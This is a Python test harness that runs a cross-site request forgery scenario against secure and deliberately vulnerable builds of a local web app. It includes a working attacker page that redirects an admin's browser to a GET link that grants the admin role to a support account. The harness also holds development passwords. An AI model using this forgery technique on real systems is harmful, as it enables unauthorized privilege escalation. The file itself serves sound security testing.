from __future__ import annotations

import hashlib
import json
import os
import subprocess
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from uuid import uuid4

import httpx
from playwright.sync_api import sync_playwright


APP_ROOT = Path(__file__).resolve().parents[1]
EVENT_SCHEMA_PATH = APP_ROOT.parent / "contracts" / "verifier-ledger-event.schema.json"
PUBLIC_ORIGIN = os.getenv("RUBY_TEST_PUBLIC_ORIGIN", "http://127.0.0.1:18080")
CONTROL_ORIGIN = os.getenv("RUBY_TEST_CONTROL_ORIGIN", "http://127.0.0.1:18081")
# 공격자 문서가 대상과 다른 등록 도메인에 있어야 브라우저의 쿠키 규칙이
# 실제 웹과 같아진다. RFC 2606 이 잡아 둔 이름이라 밖에서는 풀리지 않는다.
ATTACKER_HOST = os.getenv("RUBY_TEST_ATTACKER_HOST", "attacker-page.example")
ATTACKER_ORIGIN = f"http://{ATTACKER_HOST}:18082"
RESET_HEADERS = {"X-Ruby-Reset-Token": "development-reset-only"}
SEED_PASSWORD = "RUBY-Development-Only-2026!"
# 관리자는 시나리오가 공격자에게 건네는 계정이 아니다. 나머지 계정과 같은
# 비밀번호를 쓰면 건네준 자격증명 하나로 관리자 세션이 열린다.
SEED_ADMIN_PASSWORD = "RUBY-Operations-Only-2026!"
def seed_password(email: str) -> str:
    return (
        SEED_ADMIN_PASSWORD
        if email.strip().lower() == "admin@ruby.local"
        else SEED_PASSWORD
    )

CHROME_PATH = Path(r"C:\Program Files\Google\Chrome\Application\chrome.exe")
ADMIN_ID = "00000000-0000-4000-8000-000000000004"
SUPPORT_ID = "00000000-0000-4000-8000-000000000003"


def canonical_json(value: object) -> str:
    return json.dumps(value, ensure_ascii=False, sort_keys=True, separators=(",", ":"))


def digest_bytes(value: bytes) -> str:
    return "sha256:" + hashlib.sha256(value).hexdigest()


def digest(value: object) -> str:
    return digest_bytes(canonical_json(value).encode())


def compose(*arguments: str, environment: dict[str, str] | None = None) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        ["docker", "compose", *arguments],
        cwd=APP_ROOT,
        env=environment,
        check=True,
        capture_output=True,
        text=True,
        encoding="utf-8",
        errors="strict",
        timeout=240,
    )


def configure_api(*, trial_id: str | None, module_id: str | None) -> None:
    environment = os.environ.copy()
    environment["RUBY_WEB_TRIAL_ID"] = trial_id or ""
    environment["RUBY_WEB_VULNERABILITY_MODULES"] = module_id or ""
    compose("up", "-d", "--no-deps", "--force-recreate", "api", environment=environment)
    container_id = compose("ps", "-q", "api", environment=environment).stdout.strip()
    if not container_id:
        raise RuntimeError("API recreation created no container")
    deadline = time.monotonic() + 90
    while time.monotonic() < deadline:
        try:
            if httpx.get(f"{CONTROL_ORIGIN}/health/live", timeout=2).status_code == 200:
                return
        except httpx.HTTPError:
            pass
        state = subprocess.run(
            ["docker", "inspect", container_id, "--format", "{{.State.Status}}"],
            capture_output=True,
            text=True,
            encoding="utf-8",
            errors="replace",
            check=False,
            timeout=10,
        ).stdout.strip()
        if state in {"dead", "exited"}:
            logs = subprocess.run(
                ["docker", "logs", "--tail", "80", container_id],
                capture_output=True,
                text=True,
                encoding="utf-8",
                errors="replace",
                check=False,
                timeout=20,
            )
            detail = (logs.stdout + logs.stderr)[-4000:]
            raise RuntimeError(f"API recreation stopped with state {state}: {detail}")
        time.sleep(1)
    logs = subprocess.run(
        ["docker", "logs", "--tail", "80", container_id],
        capture_output=True,
        text=True,
        encoding="utf-8",
        errors="replace",
        check=False,
        timeout=20,
    )
    detail = (logs.stdout + logs.stderr)[-4000:]
    raise RuntimeError(f"API recreation did not become healthy: {detail}")


def reset() -> None:
    httpx.post(f"{CONTROL_ORIGIN}/internal/reset", headers=RESET_HEADERS, timeout=20).raise_for_status()


def login(client: httpx.Client, email: str) -> tuple[str, str]:
    response = client.post(
        "/api/auth/login", json={"email": email, "password": seed_password(email)}
    )
    response.raise_for_status()
    payload = response.json()
    return payload["token"], payload["user"]["id"]


def bearer(token: str) -> dict[str, str]:
    return {"Authorization": f"Bearer {token}"}


def running_image_digest(service: str) -> str:
    container_id = compose("ps", "-q", service).stdout.strip()
    return subprocess.run(
        ["docker", "inspect", container_id, "--format", "{{.Image}}"],
        check=True,
        capture_output=True,
        text=True,
        encoding="utf-8",
    ).stdout.strip()


def compose_exec(service: str, code: str, *arguments: str) -> str:
    return compose("exec", "-T", service, "python", "-c", code, *arguments).stdout.strip()


def deduplication_key() -> str:
    return f"csrf-role:{ADMIN_ID}:{SUPPORT_ID}:support_staff:admin"


def verifier() -> tuple[str, dict[str, object]]:
    scenario_id = "cross-site-request-forgery-support-role-change"
    predicate_id = scenario_id + ".effect"
    subject = {"actor_id": ADMIN_ID, "authorized": "false", "role": "admin"}
    object_ = {
        "resource_id": SUPPORT_ID,
        "previous_role": "support_staff",
        "resulting_role": "admin",
    }
    condition = {
        "deduplication_key": deduplication_key(),
        "event_type": "privilege.changed",
        "minimum_occurrences": 1,
        "object": object_,
        "protected_resource_key": "support.account-role",
        "subject": subject,
        "window_seconds": 300,
    }
    return predicate_id, {
        "contract_version": 1,
        "scenario_id": scenario_id,
        "verifier_image_digest": running_image_digest("evaluator"),
        "event_schema_digest": digest_bytes(EVENT_SCHEMA_PATH.read_bytes()),
        "network_access": "control-only",
        "attacker_visible": False,
        "predicates": [{
            "predicate_id": predicate_id,
            "effect_type": "unauthorized-resource-write",
            "event_type": "privilege.changed",
            "subject_selector": canonical_json(subject),
            "object_selector": canonical_json(object_),
            "protected_resource_key": "support.account-role",
            "condition_digest": digest(condition),
            "window_seconds": 300,
            "minimum_occurrences": 1,
            "deduplication_key": deduplication_key(),
        }],
    }


def evaluate(trial_id: str, predicate_id: str, manifest: dict[str, object]) -> dict[str, object]:
    payload = canonical_json({"trial_id": trial_id, "predicate_id": predicate_id, "verifier": manifest})
    code = (
        "import os,sys,urllib.request;"
        "r=urllib.request.Request('http://127.0.0.1:8000/internal/evaluate',"
        "data=sys.argv[1].encode(),headers={'Content-Type':'application/json',"
        "'X-Ruby-Evaluator-Token':os.environ['RUBY_EVALUATOR_TOKEN']});"
        "print(urllib.request.urlopen(r).read().decode())"
    )
    return json.loads(compose_exec("evaluator", code, payload))


class AttackPageHandler(BaseHTTPRequestHandler):
    def do_GET(self) -> None:
        # 위쪽 이동으로 승인 링크를 연다. cross-site POST 는 Lax 세션 쿠키를
        # 싣지 않으므로 폼 자동 제출로는 아무 일도 일어나지 않는다.
        target = (
            f"{PUBLIC_ORIGIN}/api/admin/users/{SUPPORT_ID}/role-form?role=admin"
        )
        body = (
            "<!doctype html><html><body><p>Loading operations console.</p>"
            f'<script>location.href={target!r}</script>'
            "</body></html>"
        ).encode()
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, format: str, *args: object) -> None:
        return


def browser_forgery(admin_token: str) -> dict[str, object]:
    server = ThreadingHTTPServer(("127.0.0.1", 18082), AttackPageHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    responses: list[int] = []
    try:
        with sync_playwright() as playwright:
            browser = playwright.chromium.launch(
                executable_path=str(CHROME_PATH),
                headless=True,
                args=[
                    "--disable-gpu",
                    "--host-resolver-rules=MAP " + ATTACKER_HOST + " 127.0.0.1",
                ],
            )
            context = browser.new_context()
            context.add_cookies([{
                "name": "ruby_session",
                "value": admin_token,
                "domain": "127.0.0.1",
                "path": "/",
                "httpOnly": True,
                "sameSite": "Lax",
            }])
            page = context.new_page()
            page.on(
                "response",
                lambda response: responses.append(response.status)
                if "/role-form" in response.url
                else None,
            )
            page.goto(ATTACKER_ORIGIN, wait_until="domcontentloaded", timeout=30_000)
            page.wait_for_url(
                "**/role-form?role=admin",
                wait_until="domcontentloaded",
                timeout=30_000,
            )
            page.wait_for_timeout(200)
            result = {
                "final_url": page.url,
                "role_form_statuses": responses,
                "response_text": page.locator("body").inner_text(),
            }
            context.close()
            browser.close()
            return result
    finally:
        server.shutdown()
        server.server_close()
        thread.join(timeout=5)


def run_condition(vulnerable: bool) -> dict[str, object]:
    module = "cross-site-request-forgery.support-role-change"
    trial_id = uuid4().hex
    configure_api(trial_id=trial_id, module_id=module if vulnerable else None)
    reset()
    with httpx.Client(base_url=PUBLIC_ORIGIN, timeout=20) as client:
        admin_token, admin_id = login(client, "admin@ruby.local")
        # 앱은 통제 평면이 이름을 불러 준 운영자의 세션만 센다. 공격자가
        # 자기 세션으로 같은 이동을 만들어도 여기서 걸린다.
        httpx.post(
            f"{CONTROL_ORIGIN}/internal/victim",
            json={"user_id": admin_id},
            headers=RESET_HEADERS,
            timeout=20,
        ).raise_for_status()
        normal = client.post(
            "/api/admin/users/00000000-0000-4000-8000-000000000001/role-form",
            headers={**bearer(admin_token), "Origin": PUBLIC_ORIGIN},
            data={"role": "customer"},
        )
        normal.raise_for_status()
        browser = browser_forgery(admin_token)
        users = client.get("/api/admin/users", headers=bearer(admin_token))
        users.raise_for_status()
    if admin_id != ADMIN_ID:
        raise RuntimeError("seed administrator identifier changed")
    support = next(item for item in users.json() if item["id"] == SUPPORT_ID)
    predicate_id, manifest = verifier()
    evaluation = evaluate(trial_id, predicate_id, manifest)
    expected_role = "admin" if vulnerable else "support_staff"
    checks = {
        "same_origin_control_succeeded": normal.status_code == 200,
        "browser_reached_role_form": browser["final_url"].endswith(
            "/role-form?role=admin"
        ),
        # 링크는 두 빌드에서 다 열린다. 안전 빌드는 확인 화면을 줄 뿐이고
        # 적용은 하지 않는다. 응답 코드로는 구별되지 않아야 한다.
        "approval_link_opened_in_both_builds": browser["role_form_statuses"] == [200],
        "support_role_matches_condition": support["role"] == expected_role,
        "private_evaluator_matches_condition": evaluation["objective_achieved"] is vulnerable,
        "event_count_matches_condition": len(evaluation["matched_event_ids"]) == (1 if vulnerable else 0),
    }
    return {
        "scenario_id": "support-role-change-csrf",
        "module_id": module,
        "condition": "vulnerable" if vulnerable else "secure",
        "trial_id": trial_id,
        "browser": browser,
        "support_role": support["role"],
        "evaluation": evaluation,
        "checks": checks,
        "passed": all(checks.values()),
    }


def main() -> int:
    parser = __import__("argparse").ArgumentParser()
    parser.add_argument("--output-dir", type=Path, required=True)
    args = parser.parse_args()
    if args.output_dir.exists():
        raise FileExistsError(f"refusing to overwrite output directory: {args.output_dir}")
    args.output_dir.mkdir(parents=True)
    report: dict[str, object]
    try:
        results = [run_condition(False), run_condition(True)]
        report = {
            "report_version": 1,
            "scenario_id": "support-role-change-csrf",
            "module_id": "cross-site-request-forgery.support-role-change",
            "results": results,
            "passed": all(item["passed"] for item in results),
        }
    finally:
        configure_api(trial_id=None, module_id=None)
        reset()
    report_path = args.output_dir / "stage3a-support-role-csrf-pair-report.json"
    report_path.write_text(json.dumps(report, ensure_ascii=False, indent=2, sort_keys=True) + "\n", encoding="utf-8")
    print(json.dumps({"report": str(report_path), "passed": report["passed"]}, sort_keys=True))
    return 0 if report["passed"] else 2


if __name__ == "__main__":
    raise SystemExit(main())
